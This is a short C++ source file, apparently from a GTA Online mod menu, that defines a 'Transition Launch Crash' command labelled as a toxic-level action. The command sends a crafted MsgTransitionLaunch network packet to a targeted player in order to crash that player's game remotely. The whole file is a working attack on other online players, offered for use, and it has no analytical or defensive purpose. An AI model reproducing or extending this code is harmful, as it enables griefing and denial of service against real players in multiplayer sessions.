#include "backend/player_command.hpp"
#include "natives.hpp"
#include "pointers.hpp"
#include "core/scr_globals.hpp"
#include "packet.hpp"
#include "gta_util.hpp"

#include <network/Network.hpp>

namespace big
{
	class transition_launch_crash : player_command
	{
		using player_command::player_command;

		virtual CommandAccessLevel get_access_level()
		{
			return CommandAccessLevel::TOXIC;
		}

		virtual void execute(player_ptr player, const std::vector<std::uint64_t>& _args, const std::shared_ptr<command_context> ctx)
		{
            packet msg;
		    msg.write_message(rage::eNetMessage::MsgTransitionLaunch);
		    msg.send(player, 7);
		}
	};

	transition_launch_crash g_transition_launch_crash("tlcrash", "Transition Launch Crash", "This is the same as remote crash", 0);
}